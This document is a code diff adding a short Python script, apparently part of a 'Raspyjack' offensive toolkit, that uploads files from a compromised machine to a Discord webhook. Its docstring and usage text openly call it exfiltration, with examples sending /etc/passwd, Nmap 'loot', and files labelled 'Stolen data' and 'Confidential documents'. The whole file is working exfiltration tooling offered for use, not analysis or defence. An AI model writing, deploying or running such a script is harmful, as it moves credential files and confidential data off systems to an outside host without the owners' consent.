@@ -1,0 +1,43 @@
+#!/usr/bin/env python3
+"""Exfiltrate files via Discord webhook.
+Usage: DISCORD_EXFIL <file_path> [title] [description]
+
+Examples:
+  DISCORD_EXFIL /root/Raspyjack/loot/Nmap/scan_results.txt
+  DISCORD_EXFIL /etc/passwd "System file" "Password file contents"
+  DISCORD_EXFIL /root/sensitive.zip "Stolen data" "Confidential documents"
+"""
+import sys
+import os
+
+# Project modules are available via PYTHONPATH set by payload_executor
+from plugins.discord_notifier_plugin.helpers.discord_utils import send_file_to_discord
+
+def main():
+    if len(sys.argv) < 2:
+        print("Usage: DISCORD_EXFIL <file_path> [title] [description]")
+        print("\nExamples:")
+        print("  DISCORD_EXFIL /root/data.txt")
+        print("  DISCORD_EXFIL /etc/passwd 'System file' 'Password file'")
+        sys.exit(1)
+    
+    file_path = sys.argv[1]
+    title = sys.argv[2] if len(sys.argv) > 2 else None
+    description = sys.argv[3] if len(sys.argv) > 3 else None
+    
+    if not os.path.exists(file_path):
+        print(f"[DiscordExfil] Error: File not found: {file_path}")
+        sys.exit(1)
+    
+    print(f"[DiscordExfil] Sending file: {file_path}")
+    success = send_file_to_discord(file_path, title, description)
+    
+    if success:
+        print(f"[DiscordExfil] ✓ File uploaded successfully")
+        sys.exit(0)
+    else:
+        print(f"[DiscordExfil] ✗ Upload failed")
+        sys.exit(1)
+
+if __name__ == '__main__':
+    main()
